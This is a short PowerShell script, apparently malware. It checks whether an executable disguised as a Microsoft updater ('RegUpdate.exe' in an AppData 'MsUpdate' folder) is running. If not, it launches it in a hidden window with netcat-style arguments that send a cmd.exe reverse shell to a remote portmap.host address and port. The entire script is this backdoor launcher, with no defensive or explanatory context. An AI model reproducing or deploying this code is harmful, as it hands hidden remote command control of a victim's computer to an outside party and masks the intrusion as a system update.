$server = "emakedie-27785.portmap.host"
$port = 38036

$UserProfile = [System.Environment]::GetFolderPath("UserProfile")
$exePath = Join-Path $UserProfile "AppData\Local\Microsoft\MsUpdate\RegUpdate.exe"

function IsRunning {  
    $Process = Get-Process -Name "RegUpdate" -ErrorAction SilentlyContinue

    if ($Process -ne $null) {
    
        return $true
    } else {
     
        return $false
    }
}

   if (-not (IsRunning) ) {
    
    Start-Process -FilePath $exePath -ArgumentList "-e cmd.exe $server $port" -WindowStyle Hidden
} 
exit